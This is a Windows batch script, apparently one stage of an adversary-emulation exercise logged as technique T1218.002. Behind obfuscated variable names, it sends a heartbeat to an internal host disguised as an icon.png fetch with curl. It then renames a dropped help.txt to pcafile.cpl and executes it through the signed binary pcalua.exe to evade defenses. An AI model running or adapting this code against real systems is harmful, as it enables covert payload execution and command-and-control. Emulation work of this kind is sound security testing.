@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET vqfzp=%APPDATA%\10213\2b754ba0
SET nkjyw=https://10.0.0.49
SET lfebg=https://10.0.0.49/stage/2/icon.png?10213-7
SET jhvpg=BALAM-S2B
SET cxbvl=7
SET wkmnt=help.txt
SET dgqrc=10213

SET lgrpt=%APPDATA%\!cxbvl!\macula-simulations.log
SET kxmpf=%APPDATA%\!cxbvl!

echo [!DATE! !TIME!][DEBUG][!jhvpg!][!dgqrc!]: heartbeat_start=>> "!lgrpt!" 2>nul
curl -k -s -o nul "!lfebg!"
echo [!DATE! !TIME!][DEBUG][!jhvpg!][!dgqrc!]: heartbeat_complete=>> "!lgrpt!" 2>nul

SET ex_cb=1
IF NOT EXIST "!vqfzp!\!wkmnt!" SET ex_cb=0
IF NOT EXIST "%SystemRoot%\System32\pcalua.exe" SET ex_cb=0

IF !ex_cb! EQU 1 (
    SET aevxg=pcafile.cpl
    REN "!vqfzp!\!wkmnt!" "!aevxg!"
    echo [!DATE! !TIME!][DEBUG][!jhvpg!][!dgqrc!]: rename_done=!aevxg!>> "!lgrpt!" 2>nul
    echo [!DATE! !TIME!][DEBUG][!jhvpg!][!dgqrc!]: exec_start=pcalua>> "!lgrpt!" 2>nul
    "%SystemRoot%\System32\pcalua.exe" -a "!vqfzp!\!aevxg!"
    IF !ERRORLEVEL! EQU 0 (
        SET ktkwt=1
        SET vgzyw=
    ) ELSE (
        SET ktkwt=0
        SET vgzyw=exit_!ERRORLEVEL!
    )
) ELSE (
    SET ktkwt=0
    SET vgzyw=file_not_found
)

echo [!DATE! !TIME!][TTP][!jhvpg!][!dgqrc!]: T1218.002|Signed_Binary_Proxy_Execution=!ktkwt!:!vgzyw!>> "!lgrpt!" 2>nul
echo [!DATE! !TIME!][DEBUG][!jhvpg!][!dgqrc!]: stage2_complete=>> "!lgrpt!" 2>nul